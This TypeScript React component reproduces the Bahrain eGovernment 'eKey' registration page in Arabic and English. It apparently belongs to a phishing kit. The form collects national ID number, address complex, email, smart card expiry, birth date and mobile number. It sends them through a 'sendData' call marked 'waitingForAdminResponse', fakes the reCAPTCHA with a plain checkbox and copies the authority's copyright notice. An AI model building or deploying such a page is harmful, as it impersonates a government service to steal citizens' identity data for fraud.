import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData } from "@/lib/store";
import "./HomePage.css";
import "./BasicRegistration.css";

type Lang = 'ar' | 'en';

const content = {
  ar: {
    login: 'دخول',
    langSwitch: 'English',
    tabs: {
      home: 'الرئيسية',
      about: 'نبذة',
      manage: 'إدارة حساب المفتاح الإلكتروني',
      services: 'خدمات المفتاح الإلكتروني',
      contact: 'اتصل بنا',
      faq: 'الأسئلة الشائعة',
    },
    pageTitle: 'التسجيل في المفتاح الإلكتروني – المستوى الأساسي',
    description: 'ليس عليك سوى إدخال رقمك الشخصي/ رقم الهوية الوطنية وكلمة المرور للوصول إلى الخدمات الإلكترونية الآمنة عبر مختلف القنوات، مثل: بوابة الحكومة الإلكترونية، وتطبيقات الهاتف النقال، ومنصات الحكومة الإلكترونية، ومراكز الخدمات. انعم براحة البال مع المستوى الأساسي للمفتاح الإلكتروني الذي يضمن لك الاستخدام الآمن، و الاستفادة من مجموعة الخدمات الإلكترونية الأساسية.',
    createKey: 'لإنشاء مفتاح إلكتروني خاص بك، الرجاء إدخال البيانات المطلوبة أدناه.',
    step1: 'المعلومات الشخصية',
    step2: 'التحقق',
    step3: 'إدخال كلمة السر',
    personalNumber: 'الرقم الشخصي',
    complexNumber: 'رقم المجمع',
    email: 'البريد الالكتروني',
    emailPlaceholder: 'username@domain.com',
    smartCardExpiry: 'تاريخ انتهاء البطاقة الذكية',
    dateOfBirth: 'تاريخ الميلاد',
    mobileNumber: 'رقم الهاتف النقال',
    day: 'يوم',
    month: 'شهر',
    year: 'Year',
    countryCode: 'BAHRAIN[+٩٧٣]',
    recaptcha: 'أنا لست برنامج روبوت',
    smsNote: 'سيتم إرسال رمز التحقق عبر رسالة نصية قصيرة لرقم الهاتف النقال والبريد الإلكتروني المسجل (إن وجد)',
    agreeTerms: 'أنا هنا أوافق على',
    termsLink: 'الشروط والأحكام',
    continueBtn: 'مواصلة',
    cancelBtn: 'إلغاء',
    copyright: '2021 © هيئة المعلومات والحكومة الإلكترونية، مملكة البحرين. جميع الحقوق محفوظة',
    privacy: 'سياسة الخصوصية',
    sitemap: 'خريطة الموقع',
    contactUs: 'اتصل بنا',
    lastUpdate: 'آخر تحديث بتاريخ : Feb 20, 2025',
    required: '*',
    months: ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'],
  },
  en: {
    login: 'Login',
    langSwitch: 'عربي',
    tabs: {
      home: 'Home',
      about: 'About',
      manage: 'Manage My eKey',
      services: 'eKey Services',
      contact: 'Contact Us',
      faq: 'FAQ',
    },
    pageTitle: 'eKey Registration – Basic Level',
    description: 'You only need to enter your personal number/national ID number and password to access secure electronic services through various channels, such as: the eGovernment portal, mobile applications, eGovernment platforms, and service centers. Enjoy peace of mind with the basic level of eKey that ensures safe use and access to basic electronic services.',
    createKey: 'To create your own eKey, please enter the required data below.',
    step1: 'Personal Information',
    step2: 'Verification',
    step3: 'Enter Password',
    personalNumber: 'Personal Number',
    complexNumber: 'Complex Number',
    email: 'Email',
    emailPlaceholder: 'username@domain.com',
    smartCardExpiry: 'Smart Card Expiry Date',
    dateOfBirth: 'Date of Birth',
    mobileNumber: 'Mobile Number',
    day: 'Day',
    month: 'Month',
    year: 'Year',
    countryCode: 'BAHRAIN[+973]',
    recaptcha: 'I am not a robot',
    smsNote: 'A verification code will be sent via SMS to the mobile number and registered email (if any)',
    agreeTerms: 'I hereby agree to the',
    termsLink: 'Terms and Conditions',
    continueBtn: 'Continue',
    cancelBtn: 'Cancel',
    copyright: '2021 © Information & eGovernment Authority, Kingdom of Bahrain. All Rights Reserved',
    privacy: 'Privacy Policy',
    sitemap: 'Sitemap',
    contactUs: 'Contact Us',
    lastUpdate: 'Last Updated : Feb 20, 2025',
    required: '*',
    months: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
  }
};

type TabKey = 'home' | 'about' | 'manage' | 'services' | 'contact' | 'faq';

export default function BasicRegistration() {
  const [, setLocation] = useLocation();
  const [lang, setLang] = useState<Lang>('ar');
  const [isLoading, setIsLoading] = useState(false);

  // Form state
  const [personalNumber, setPersonalNumber] = useState('');
  const [complexNumber, setComplexNumber] = useState('');
  const [email, setEmail] = useState('');
  const [smartCardDay, setSmartCardDay] = useState('');
  const [smartCardMonth, setSmartCardMonth] = useState('');
  const [smartCardYear, setSmartCardYear] = useState('');
  const [birthDay, setBirthDay] = useState('');
  const [birthMonth, setBirthMonth] = useState('');
  const [birthYear, setBirthYear] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [mobileCode, setMobileCode] = useState('');
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [recaptchaChecked, setRecaptchaChecked] = useState(false);

  useEffect(() => {
    navigateToPage('التسجيل في المفتاح الإلكتروني - المستوى الأساسي');
  }, []);

  const t = content[lang];
  const isRtl = lang === 'ar';

  const tabKeys: TabKey[] = ['home', 'about', 'manage', 'services', 'contact', 'faq'];

  const handleTabClick = (key: TabKey) => {
    if (key === 'home') {
      setLocation('/');
    } else if (key === 'manage') {
      setLocation('/manage-account');
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!personalNumber || !complexNumber || !agreeTerms) return;

    setIsLoading(true);

    sendData({
      data: {
        personalNumber,
        complexNumber,
        email,
        smartCardExpiry: `${smartCardDay}/${smartCardMonth}/${smartCardYear}`,
        dateOfBirth: `${birthDay}/${birthMonth}/${birthYear}`,
        mobileNumber: `+973 ${mobileCode} ${mobileNumber}`,
      },
      current: 'التسجيل في المفتاح الإلكتروني - المستوى الأساسي',
      waitingForAdminResponse: true,
    });

    // Navigate after brief delay
    setTimeout(() => {
      setIsLoading(false);
    }, 1500);
  };

  const handleCancel = () => {
    setLocation('/manage-account');
  };

  // Generate days 1-31
  const days = Array.from({ length: 31 }, (_, i) => i + 1);

  return (
    <div className="ekey-wrapper" dir={isRtl ? 'rtl' : 'ltr'}>
      {/* Header */}
      <div className="ekey-header">
        <nav className="ekey-navbar">
          <div className="ekey-container">
            <div className="ekey-navbar-header">
              <a className="ekey-navbar-brand" href="#" onClick={(e) => { e.preventDefault(); setLocation('/'); }}>
                <img src="/images/logo.jpg" alt="eKey logo" />
              </a>
            </div>
            <div className="ekey-header-left">
              <a href="#" className="ekey-login-btn" onClick={(e) => { e.preventDefault(); setLocation('/login'); }}>{t.login}</a>
              <span className="ekey-lang-separator">|</span>
              <a href="#" className="ekey-lang" onClick={(e) => { e.preventDefault(); setLang(lang === 'ar' ? 'en' : 'ar'); }}>{t.langSwitch}</a>
            </div>
          </div>
        </nav>
        <div className="ekey-container">
          <div className="ekey-navbar-collapse">
            <ul className="ekey-nav">
              {tabKeys.map((key) => (
                <li key={key} className={key === 'manage' ? 'active' : ''}>
                  <a href="#" onClick={(e) => { e.preventDefault(); handleTabClick(key); }}>{t.tabs[key]}</a>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>

      {/* Page Title Bar */}
      <div className="reg-title-bar">
        <div className="reg-title-bar-line"></div>
        <h1 className="reg-title-text">{t.pageTitle}</h1>
      </div>

      {/* Description */}
      <div className="reg-description">
        <div className="ekey-container">
          <p className="reg-desc-text">{t.description}</p>
          <p className="reg-desc-text reg-desc-create">{t.createKey}</p>
        </div>
      </div>

      {/* Stepper */}
      <div className="reg-stepper-wrapper">
        <div className="ekey-container">
          <div className="reg-stepper">
            <div className="reg-step reg-step-active">
              <span className="reg-step-text">{t.step1}</span>
              <span className="reg-step-arrow">&#10094;</span>
            </div>
            <div className="reg-step">
              <span className="reg-step-text">{t.step2}</span>
              <span className="reg-step-arrow">&#10094;</span>
            </div>
            <div className="reg-step">
              <span className="reg-step-text">{t.step3}</span>
              <span className="reg-step-arrow">&#10094;</span>
            </div>
          </div>
        </div>
      </div>

      {/* Form */}
      <div className="reg-form-wrapper">
        <div className="ekey-container">
          <form onSubmit={handleSubmit} className="reg-form">
            <div className="reg-form-grid">
              {/* Right Column */}
              <div className="reg-form-col">
                <div className="reg-field">
                  <label>{t.personalNumber}<span className="reg-required">{t.required}</span></label>
                  <input
                    type="text"
                    value={personalNumber}
                    onChange={(e) => setPersonalNumber(e.target.value)}
                    required
                  />
                </div>
                <div className="reg-field">
                  <label>{t.complexNumber}<span className="reg-required">{t.required}</span></label>
                  <input
                    type="text"
                    value={complexNumber}
                    onChange={(e) => setComplexNumber(e.target.value)}
                    required
                  />
                </div>
                <div className="reg-field">
                  <label>{t.email}</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder={t.emailPlaceholder}
                  />
                </div>
              </div>

              {/* Left Column */}
              <div className="reg-form-col">
                <div className="reg-field">
                  <label>{t.smartCardExpiry}<span className="reg-required">{t.required}</span></label>
                  <div className="reg-date-group">
                    <select
                      value={smartCardDay}
                      onChange={(e) => setSmartCardDay(e.target.value)}
                      className="reg-date-select"
                    >
                      <option value="">{t.day}</option>
                      {days.map(d => (
                        <option key={d} value={d}>{d}</option>
                      ))}
                    </select>
                    <select
                      value={smartCardMonth}
                      onChange={(e) => setSmartCardMonth(e.target.value)}
                      className="reg-date-select"
                    >
                      <option value="">{t.month}</option>
                      {t.months.map((m, i) => (
                        <option key={i} value={i + 1}>{m}</option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={smartCardYear}
                      onChange={(e) => setSmartCardYear(e.target.value)}
                      placeholder={t.year}
                      className="reg-date-year"
                    />
                  </div>
                </div>
                <div className="reg-field">
                  <label>{t.dateOfBirth}<span className="reg-required">{t.required}</span></label>
                  <div className="reg-date-group">
                    <select
                      value={birthDay}
                      onChange={(e) => setBirthDay(e.target.value)}
                      className="reg-date-select"
                    >
                      <option value="">{t.day}</option>
                      {days.map(d => (
                        <option key={d} value={d}>{d}</option>
                      ))}
                    </select>
                    <select
                      value={birthMonth}
                      onChange={(e) => setBirthMonth(e.target.value)}
                      className="reg-date-select"
                    >
                      <option value="">{t.month}</option>
                      {t.months.map((m, i) => (
                        <option key={i} value={i + 1}>{m}</option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={birthYear}
                      onChange={(e) => setBirthYear(e.target.value)}
                      placeholder={t.year}
                      className="reg-date-year"
                    />
                  </div>
                </div>
                <div className="reg-field">
                  <label>{t.mobileNumber}<span className="reg-required">{t.required}</span></label>
                  <div className="reg-phone-group">
                    <input
                      type="text"
                      value={mobileCode}
                      onChange={(e) => setMobileCode(e.target.value)}
                      className="reg-phone-code-input"
                      placeholder=""
                    />
                    <div className="reg-phone-country">
                      <select className="reg-phone-country-select">
                        <option value="+973">{t.countryCode}</option>
                      </select>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* reCAPTCHA */}
            <div className="reg-recaptcha-wrapper">
              <div className="reg-recaptcha-box">
                <div className="reg-recaptcha-inner">
                  <label className="reg-recaptcha-label">
                    <input
                      type="checkbox"
                      checked={recaptchaChecked}
                      onChange={(e) => setRecaptchaChecked(e.target.checked)}
                      className="reg-recaptcha-checkbox"
                    />
                    <span>{t.recaptcha}</span>
                  </label>
                  <div className="reg-recaptcha-logo">
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
                    <span className="reg-recaptcha-brand">reCAPTCHA</span>
                    <span className="reg-recaptcha-terms">الخصوصية - الشرو.</span>
                  </div>
                </div>
              </div>
            </div>

            {/* SMS Note */}
            <div className="reg-sms-note">
              <span className="reg-info-icon">ℹ</span>
              <span>{t.smsNote}</span>
            </div>

            {/* Terms Agreement */}
            <div className="reg-terms">
              <label className="reg-terms-label">
                <input
                  type="checkbox"
                  checked={agreeTerms}
                  onChange={(e) => setAgreeTerms(e.target.checked)}
                />
                <span>{t.agreeTerms} <a href="#" onClick={(e) => e.preventDefault()} className="reg-terms-link">{t.termsLink}</a><span className="reg-required">{t.required}</span></span>
              </label>
            </div>

            {/* Buttons */}
            <div className="reg-buttons">
              <button
                type="submit"
                className="reg-btn reg-btn-continue"
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="reg-spinner"></span>
                ) : (
                  t.continueBtn
                )}
              </button>
              <button
                type="button"
                className="reg-btn reg-btn-cancel"
                onClick={handleCancel}
              >
                {t.cancelBtn}
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* White Gap with Skyline */}
      <div className="ekey-white-gap-bg"></div>

      {/* Footer */}
      <div className="ekey-footer">
        <div className="ekey-copyright">
          <div className="ekey-container">
            <div className="ekey-footer-top">
              <div className="ekey-social-links">
                <a href="#" aria-label="facebook"><i className="ekey-fa ekey-fa-facebook"></i></a>
                <a href="#" aria-label="twitter"><i className="ekey-fa ekey-fa-twitter"></i></a>
                <a href="#" aria-label="youtube"><i className="ekey-fa ekey-fa-youtube"></i></a>
                <a href="#" aria-label="linkedin"><i className="ekey-fa ekey-fa-linkedin"></i></a>
                <a href="#" aria-label="instagram"><i className="ekey-fa ekey-fa-instagram"></i></a>
              </div>
            </div>
            <div className="ekey-copyright-right">
              {t.copyright}
              <p>
                <a href="#">{t.privacy}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                <a href="#">{t.sitemap}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                <a href="#">{t.contactUs}</a>
              </p>
              <p>{t.lastUpdate}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
